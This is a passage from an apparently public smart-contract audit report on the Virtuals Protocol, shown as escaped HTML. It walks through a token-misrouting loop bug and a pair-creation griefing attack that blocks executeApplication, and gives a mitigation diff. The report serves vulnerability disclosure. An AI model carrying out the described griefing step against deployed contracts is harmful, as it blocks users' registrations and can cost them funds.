0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eAssume the following scenario. The loop processes the following values, controlled by user:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentIds = [0, 1, 0]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eamounts  = [10, 20, 30]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eInitialization:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eprevAgentId = 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentTba = address(0)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 0:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 0)\u003c/code\u003e → FALSE\u003c/li\u003e\n\u003cli\u003eNo update to \u003ccode\u003eagentTba\u003c/code\u003e (remains \u003ccode\u003eaddress(0)\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ User lost 10 tokens unintentionally.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 1:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 1\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 1)\u003c/code\u003e → TRUE\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eagentTba\u003c/code\u003e is updated: \u003ccode\u003eagentTba = agentNft.virtualInfo(1).tba\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e→ BUT: \u003ccode\u003eprevAgentId\u003c/code\u003e is not updated, so it still holds 0\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagent1Tba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ So that’s correct.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 2:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 0)\u003c/code\u003e → FALSE\u003c/li\u003e\n\u003cli\u003eNo update to \u003ccode\u003eagentTba\u003c/code\u003e, which still holds the address for agent 1.\u003c/li\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagent1Tba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e30\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ Tokens are sent to the wrong agent (agent 1 instead of agent 0).\u003c/p\u003e\n\u003ch3 id=\"root-cause\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause\" aria-label=\"root cause permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eThe condition to fetch a new \u003ccode\u003eagentTba\u003c/code\u003e relies on \u003ccode\u003eprevAgentId\u003c/code\u003e being updated after each successful fetch.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eBecause \u003ccode\u003eprevAgentId\u003c/code\u003e is never updated inside the loop, the caching logic becomes broken:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe first transfer may lose tokens (if \u003ccode\u003eagentId == 0\u003c/code\u003e and no update is triggered),\u003c/li\u003e\n\u003cli\u003eSubsequent transfers may send tokens to incorrect agents if agentId switches back and forth.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-26\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-26\" aria-label=\"medium risk findings 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (26)\u003c/h1\u003e\n\u003ch2 id=\"m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\" style=\"position:relative;\"\u003e\u003ca href=\"#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\" aria-label=\"m 01 attacker can prevent user from executing application registered through initfromtoken in agentfactoryv4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-2\"\u003e[M-01] Attacker can prevent user from executing application registered through \u003ccode\u003einitFromToken()\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e.\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-332\"\u003e0x04bytes\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-248\"\u003e0xShitgem\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-262\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-446\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-489\"\u003enewspacexyz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-823\"\u003eoakcobalt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-780\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-481\"\u003epatitonar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-171\"\u003eRaOne\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-347\"\u003eshui\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-779\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAgentFactoryV4\u003c/code\u003e allowed user to register agent with existing/custom agent token. The flow is divided in two steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003einitFromToken()\u003c/code\u003e, where the user populates registration with required metadata.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexecuteApplication()\u003c/code\u003e, where the application is executed, setting up agent token, dao and provision liquidity on uniswap v2.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhen an application is executed in \u003ccode\u003eexecuteApplication()\u003c/code\u003e, the contract will check whether the agent token is custom or not. When the agent token is custom, the contract will skip agent token creation step and instead directly create a new pair on uniswap v2 for liquidity provisioning. To prevent the user from provisioning liquidity before execution, the \u003ccode\u003e_createPair()\u003c/code\u003e internal function will check the existence of the pair. But this check is not enough because any user can permissionlessly create a new pair without provisioning liquidity. This condition can be used by attacker to prevent user from executing application by simply creating a transaction that calls \u003ccode\u003euniswapV2Factory.createPair(agentToken, assetToken)\u003c/code\u003e before the victim calls \u003ccode\u003eexecuteApplication()\u003c/code\u003e. The execution will fail because the check \u003ccode\u003erequire(factory.getPair(tokenAddr, assetToken) == address(0), \"pool already exists\");\u003c/code\u003e will revert since the pair is already created by the attacker in the previous transaction.\u003c/p\u003e\n\u003ch3 id=\"impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUser that register through \u003ccode\u003einitFromToken()\u003c/code\u003e unable to execute the application.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThe attacker monitor the transaction that calls \u003ccode\u003eagentFactoryV4.initFromToken()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBack-run that transaction with a transaction that calls \u003ccode\u003euniswapV2Factory.createPair(agentToken, assetToken)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eexecuteApplication()\u003c/code\u003e now will revert with pool exists error for the given application id.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cp\u003eSimply verifying \u003ccode\u003euniswapV2Factory.getPair(tokenAddr, assetToken) == address(0))\u003c/code\u003e is not enough. When the token pair exists, it is crucial to check if the \u003ccode\u003etotalSupply\u003c/code\u003e of LP token is equal to 0. By doing that, we can make sure that there is no liquidity provisioned before the execution.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction _createPair(address tokenAddr) internal returns (address uniswapV2Pair_) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    IUniswapV2Factory factory = IUniswapV2Factory(IUniswapV2Router02(_uniswapRouter).factory());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   uniswapV2Pair_ = uniswapV2Factory.getPair(tokenAddr, assetToken);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   // valid only if the pair doesn\u0026#39;t exist or the total supply of the pair is 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require((uniswapV2Pair_ == address(0)) || (IUniswapV2Pair(uniswapV2Pair_).totalSupply() == 0), \u0026quot;pool already exists\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   require(factory.getPair(tokenAddr, assetToken) == address(0), \u0026quot;pool already exists\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   if(uniswapV2Pair_ == address(0)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       uniswapV2Pair_ = factory.createPair(tokenAddr, assetToken);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    return (uniswapV2Pair_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-02-missing-slippage-protection-on-buy-and-sell\" style=\"position:relative;\"\u003e\u003ca href=\"#m-02-missing-slippage-protection-on-buy-and-sell\" aria-label=\"m 02 missing slippage protection on buy and sell permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-4\"\u003e[M-02] Missing slippage protection on buy and sell\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-718\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-308\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-633\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-338\"\u003e0xbc000\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-550\"\u003e0xterrah\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-238\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-286\"\u003eb1n4ry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-618\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-371\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-313\"\u003eBowTiedOriole\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-488\"\u003ebytesguard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-743\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-197\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-611\"\u003eCoheeYang\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-589\"\u003eDamola0x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-139\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-495\"\u003eEjineroz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-787\"\u003eEniwealth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-448\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-842\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-721\"\u003ejamshed\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-320\"\u003eJeremias\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-582\"\u003eKweks\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-417\"\u003emihailvichev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-565\"\u003engo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-690\"\u003eNHristov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-680\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-462\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-264\"\u003epro_king\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-830\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-822\"\u003eSeveritySquad\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-133\"\u003eShinobi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-333\"\u003eshui\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-438\"\u003eslowbugmayor\u003c/a\u003e, \u003ca 